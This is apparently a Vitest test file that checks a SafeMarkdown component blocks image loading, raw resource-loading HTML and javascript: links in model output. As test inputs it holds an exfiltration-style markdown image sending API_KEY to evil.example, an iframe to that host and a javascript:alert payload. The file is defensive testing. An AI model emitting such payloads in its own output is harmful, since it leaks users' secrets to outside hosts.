import { describe, expect, it } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import { createElement } from "react";
import { SafeMarkdown, safeUrl } from "../../src/ui/Markdown";

const render = (md: string) => renderToStaticMarkup(createElement(SafeMarkdown, null, md));

describe("SafeMarkdown (model output)", () => {
  it("never renders <img>: images become a plain, non-loading link", () => {
    const html = render("Look ![secret](https://evil.example/x.png?q=API_KEY) here");
    expect(html).not.toMatch(/<img/i);
    expect(html).toContain('href="https://evil.example/x.png?q=API_KEY"');
    expect(html).toContain("🖼 secret");
    expect(html).toContain('rel="noreferrer noopener"');
  });
  it("reference-style and data: images are not loaded either", () => {
    expect(render("![a][r]\n\n[r]: https://evil.example/r.png")).not.toMatch(/<img/i);
    const html = render("![x](data:image/png;base64,AAAA)");
    expect(html).not.toMatch(/<img|data:image/i);
  });
  it("drops raw HTML that could load resources", () => {
    const html = render('<img src="https://evil.example/a.png"><iframe src="https://evil.example"></iframe><video src="https://e/v.mp4"></video> ok');
    expect(html).not.toMatch(/<img|<iframe|<video/i);
    expect(html).toContain("ok");
  });
  it("keeps footnote anchors, neutralises javascript: links", () => {
    const html = render("Fact[^1]\n\n[^1]: quote\n\n[bad](javascript:alert(1)) [good](https://example.com)");
    expect(html).toContain("data-footnote-ref");
    expect(html).not.toContain("javascript:");
    expect(html).toContain('href="https://example.com"');
    expect(safeUrl("vbscript:x")).toBe("");
  });
});
